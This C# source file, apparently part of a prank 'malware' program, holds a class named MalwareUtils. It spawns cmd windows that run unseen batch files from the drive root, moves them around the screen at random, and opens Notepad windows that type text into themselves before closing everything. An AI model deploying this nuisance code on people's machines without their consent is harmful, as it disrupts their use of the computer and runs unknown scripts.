using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

public class MalwareUtils
{
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

    [DllImport("User32.dll")]
    private static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

    [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
    private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    public static void RunMatrixEffect(int matrixEffects, bool doContinuosMoving, int continuosMovingDelay)
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        List<Process> runProcesses = new List<Process>();
        Thread.Sleep(1000);

        for (int i = 0; i < matrixEffects; i++)
        {
            try
            {
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\MatrixEffect.bat\"");
                processInfo.CreateNoWindow = false;
                processInfo.UseShellExecute = false;
                Process process = Process.Start(processInfo);
                runProcesses.Add(process);

                while (process.MainWindowHandle.ToInt32() == 0)
                {
                    Thread.Sleep(1);
                }

                MoveWindow(process.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
            }
            catch
            {

            }
        }

        if (doContinuosMoving)
        {
            foreach (Process process in runProcesses)
            {
                new Thread(() =>
                {
                    while (true)
                    {
                        Thread.Sleep(continuosMovingDelay);

                        try
                        {
                            Process.GetProcessById(process.Id);

                            if (process.MainWindowHandle.ToInt32() != 0)
                            {
                                MoveWindow(process.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
                            }
                        }
                        catch
                        {
                            break;
                        }
                    }
                }).Start();
            }
        }

        Thread.Sleep(3250);

        foreach (Process process in runProcesses)
        {
            process.Kill();
        }

        runProcesses.Clear();
    }

    public static void DoWindows6Loading(int windows, int delay)
    {
        string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
        List<Process> runProcesses = new List<Process>();
        Thread.Sleep(1000);
        int currentY = 0;

        for (int i = 0; i < windows; i++)
        {
            try
            {
                Thread.Sleep(delay);
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c \"" + rootDir + "\\Windows6Loading.bat\"");
                processInfo.CreateNoWindow = false;
                processInfo.UseShellExecute = false;
                Process process = Process.Start(processInfo);
                runProcesses.Add(process);

                while (process.MainWindowHandle.ToInt32() == 0)
                {
                    Thread.Sleep(1);
                }

                MoveWindow(process.MainWindowHandle, 0, currentY, 970, 500, true);
                currentY += 10;
            }
            catch
            {

            }
        }

        Thread.Sleep(1750);

        foreach (Process process in runProcesses)
        {
            process.Kill();
        }

        runProcesses.Clear();
    }

    public static void OpenNotepadAndWrite(string str, int writeDelay, int delayAfterWindow, int quantity, int closeAfterDelay)
    {
        for (int i = 0; i < quantity; i++)
        {
            new Thread(() =>
            {
                try
                {
                    string rootDir = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":";
                    ProcessStartInfo processInfo = new ProcessStartInfo("notepad.exe");
                    processInfo.CreateNoWindow = false;
                    processInfo.UseShellExecute = false;
                    processInfo.WindowStyle = ProcessWindowStyle.Maximized;
                    Process notepadProcess = Process.Start(processInfo);
                    IntPtr notepadTextBox = IntPtr.Zero;

                    while (notepadTextBox == IntPtr.Zero || notepadTextBox == new IntPtr(-1) || notepadProcess.MainWindowHandle == IntPtr.Zero || notepadProcess.MainWindowHandle == new IntPtr(-1))
                    {
                        notepadTextBox = FindWindowEx(notepadProcess.MainWindowHandle, IntPtr.Zero, "Edit", null);
                        Thread.Sleep(1);
                    }

                    MoveWindow(notepadProcess.MainWindowHandle, Utils.random.GetRandomInt32(0, 800), Utils.random.GetRandomInt32(0, 500), 970, 500, true);
                    Thread.Sleep(delayAfterWindow);
                    string completeText = "";

                    foreach (char c in str)
                    {
                        completeText += c;
                        SendMessage(notepadTextBox, 0x000C, 0, completeText);
                        Thread.Sleep(writeDelay);
                    }

                    Thread.Sleep(closeAfterDelay);
                    notepadProcess.Kill();
                }
                catch
                {

                }
            }).Start();
        }

        Thread.Sleep(closeAfterDelay + 1500);
    }
}